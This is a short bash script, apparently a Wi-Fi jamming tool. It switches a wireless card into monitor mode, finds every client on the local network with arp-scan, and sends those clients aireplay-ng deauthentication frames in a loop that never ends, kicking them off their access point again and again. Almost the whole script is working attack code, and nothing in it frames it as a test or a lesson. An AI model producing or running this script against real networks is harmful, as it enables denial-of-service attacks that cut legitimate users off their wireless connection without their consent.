#!/bin/bash

shopt -s extglob

NIC=$1
BSSID=$(iwconfig wlan0 | grep -io '[0-9A-F]\{2\}\(:[0-9A-F]\{2\}\)\{5\}')
POLL=15

airmon-ng stop mon0
airmon-ng start $NIC

while true; do
    for TARGET in $(arp-scan -I $NIC --localnet | grep -o -E \
    '([[:xdigit:]]{1,2}:){5}[[:xdigit:]]{1,2}'); do
        echo "Kicking $TARGET from $BSSID"
        aireplay-ng -0 1 -a $BSSID -c $TARGET mon0 --ignore-negative-one
    done
    sleep $POLL
done
airmon-ng stop mon0
